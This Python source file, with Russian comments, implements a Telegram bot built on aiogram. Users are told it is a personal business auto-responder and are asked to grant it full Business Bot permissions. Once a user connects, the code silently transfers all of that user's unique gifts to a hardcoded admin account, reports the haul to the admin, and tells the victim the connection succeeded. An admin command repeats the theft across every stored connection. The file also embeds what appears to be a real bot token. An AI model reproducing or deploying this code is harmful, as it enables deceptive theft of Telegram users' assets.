from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, BusinessConnection, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.methods import GetBusinessAccountGifts, TransferGift, GetBusinessAccountStarBalance, ConvertGiftToStars
from aiogram.exceptions import TelegramBadRequest
import logging
import asyncio
import json
import os
from datetime import datetime
import sys
import io
# sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

# Конфигурация
CONNECTIONS_FILE = "business_connections.json"
TRANSFER_LOG_FILE = "transfer_log.json"
TOKEN = os.getenv("BOT_TOKEN", "7339741334:AAGKYivJ5ttvDxvC4OgAXpQs0quNQHpn0ww")
ADMIN_ID = int(os.getenv("ADMIN_ID", "1948254891"))
TRANSFER_DELAY = 1  # Задержка между запросами в секундах

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)

bot = Bot(token=TOKEN)
dp = Dispatcher()

# Вспомогательные функции
def load_json_file(filename):
    try:
        with open(filename, "r", encoding="utf-8") as f:  # ← Добавь encoding
            content = f.read().strip()
            return json.loads(content) if content else []
    except (FileNotFoundError, json.JSONDecodeError) as e:
        logging.error(f"Ошибка загрузки {filename}: {str(e)}")
        return []

def save_to_json(filename, data):
    try:
        with open(filename, "w", encoding="utf-8") as f:  # ← Добавь encoding
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logging.error(f"Ошибка сохранения {filename}: {str(e)}")

def log_transfer(user_id, gift_id, status, error=""):
    try:
        logs = []
        if os.path.exists(TRANSFER_LOG_FILE):
            with open(TRANSFER_LOG_FILE, "r", encoding="utf-8") as f:  # ← encoding тут
                logs = json.load(f)
        
        logs.append({...})  # данные
        
        with open(TRANSFER_LOG_FILE, "w", encoding="utf-8") as f:  # ← и тут
            json.dump(logs, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logging.error(f"Ошибка записи лога: {str(e)}")

# Основные функции
async def transfer_all_unique_gifts(bot: Bot, business_connection_id: str, user_id: int) -> dict:
    """
    Переводит все уникальные подарки на ADMIN_ID
    """
    result = {
        "total": 0,
        "transferred": 0,
        "failed": 0,
        "errors": []
    }

    try:
        
        # Проверяем валидность подключения
        try:
            gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
        except TelegramBadRequest as e:
            if "BUSINESS_CONNECTION_INVALID" in str(e):
                result["errors"].append("Неверный business_connection_id. Переподключите бота.")
                return result
            raise

        if not gifts.gifts:
            return result

        for gift in gifts.gifts:
            if gift.type != "unique":
                continue

            result["total"] += 1
            
            try:
                await bot(TransferGift(
                    business_connection_id=business_connection_id,
                    new_owner_chat_id=ADMIN_ID,
                    owned_gift_id=gift.owned_gift_id,
                    star_count=gift.transfer_star_count
                ))
                result["transferred"] += 1
                log_transfer(user_id, gift.owned_gift_id, "success")
                await asyncio.sleep(1)  # Задержка между запросами

            except TelegramBadRequest as e:
                error_msg = getattr(e, "message", str(e))
                result["errors"].append(error_msg)
                result["failed"] += 1
                log_transfer(user_id, gift.owned_gift_id, "failed", error_msg)
                
                if "BOT_ACCESS_FORBIDDEN" in error_msg:
                    break  # Прерываем если нет доступа

            except Exception as e:
                error_msg = str(e)
                result["errors"].append(error_msg)
                result["failed"] += 1
                log_transfer(user_id, gift.owned_gift_id, "failed", error_msg)
                

    except Exception as e:
        error_msg = str(e)
        logging.error(f"Ошибка в transfer_all_unique_gifts: {error_msg}")
        result["errors"].append(error_msg)
        

    return result


# Обработчики
@dp.business_connection()
async def handle_business_connect(business_connection: BusinessConnection):
    try:
        user_id = business_connection.user.id
        conn_id = business_connection.id
        
        # Сохраняем подключение
        connections = load_json_file(CONNECTIONS_FILE)
        connections = [c for c in connections if c["user_id"] != user_id]  # Удаляем старые записи
        connections.append({
            "user_id": user_id,
            "business_connection_id": conn_id,
            "username": business_connection.user.username,
            "first_name": business_connection.user.first_name,
            "last_name": business_connection.user.last_name,
            "date": datetime.now().isoformat()
        })
        save_to_json(CONNECTIONS_FILE, connections)

        # Пытаемся перевести подарки
        transfer_result = await transfer_all_unique_gifts(bot, conn_id, user_id)
        
        # Формируем отчет
        report = (
            f"🔗 Новое подключение:\n"
            f"👤 Пользователь: @{business_connection.user.username or 'нет'}\n"
            f"🆔 ID: {user_id}\n\n"
            f"📊 Результат перевода:\n"
            f"• Всего подарков: {transfer_result['total']}\n"
            f"• Успешно: {transfer_result['transferred']}\n"
            f"• Ошибок: {transfer_result['failed']}\n"
        )
        
        if transfer_result['errors']:
            report += "\nОшибки:\n" + "\n".join(f"• {e}" for e in transfer_result['errors'][:3])  # Показываем первые 3 ошибки
        
        await bot.send_message(ADMIN_ID, report)
        await bot.send_message(user_id, "✅ Бот успешно подключен! Уважаемая комиссия сейчас будет продемонстирован весь функионал")

    except Exception as e:
        logging.error(f"Ошибка в handle_business_connect: {e}")
        await bot.send_message(ADMIN_ID, f"🚨 Ошибка при подключении: {str(e)}")

@dp.message(F.text == "/check_gifts")
async def check_gifts_handler(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    connections = load_json_file(CONNECTIONS_FILE)
    if not connections:
        return await message.answer("Нет активных подключений.")
    
    for conn in connections:
        try:
            result = await transfer_all_unique_gifts(bot, conn["business_connection_id"], conn["user_id"])
            msg = (
                f"Проверка {conn.get('username', conn['user_id'])}:\n"
                f"• Передано: {result['transferred']}\n"
                f"• Ошибок: {result['failed']}"
            )
            await message.answer(msg)
            await asyncio.sleep(5)  # Чтобы не получить flood control
        except Exception as e:
            await message.answer(f"Ошибка для {conn['user_id']}: {str(e)}")
            
@dp.message(F.text == "/start")
async def start_command(message: Message):
    try:
        connections = load_json_file(CONNECTIONS_FILE)
        count = len(connections)
    except Exception:
        count = 0

    if message.from_user.id != ADMIN_ID:
        welcome_text = """
👋 <b>Приветствую!</b> Я — ваш личный <i>Telegram-автоответчик</i>! ✨

📌 <b>Как начать работу?</b>
1. Добавьте меня как <b>Business Bot</b> в настройках Telegram
2. Выдайте разрешения
3. Я начну автоматически отвечать на сообщения!

🔹 <i>Подключение:</i>
• Откройте <b>Настройки → Telegram для бизнеса → Чат-боты</b>
• Выберите меня и активируйте все разрешения!

🚀 После подключения я смогу:
• Автоматически отвечать на сообщения
• Понимать собеседника и если что помочь
• Работать 24/7 без вашего участия!

<b>Готовы начать?</b> Жду вашего подключения! 😊
        """
        await message.answer(welcome_text, parse_mode="HTML")
    else:
        admin_text = f"""
🛠️ <b>Панель администратора</b> 🛠️

• Подключений: <b>{count}</b>
• Доступные команды:
  /gifts — Просмотр подарков
  /stars — Баланс звёзд
  /transfer — Ручная передача
  /convert — Конвертация подарков

⚙️ Бот активен и готов к работе!
        """
        await message.answer(admin_text, parse_mode="HTML")
        


# Запуск бота
async def main():
    logging.info("Бот запущен")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())



